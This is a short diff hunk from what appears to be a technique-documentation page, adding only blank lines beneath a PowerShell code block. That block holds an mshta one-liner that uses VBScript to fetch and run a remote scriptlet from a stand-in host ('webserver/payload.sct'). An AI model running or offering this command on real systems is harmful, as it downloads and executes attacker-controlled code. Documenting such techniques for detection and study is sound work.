@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:37:11.501056+00:00'
 ```powershell
 mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
 ```
+
+
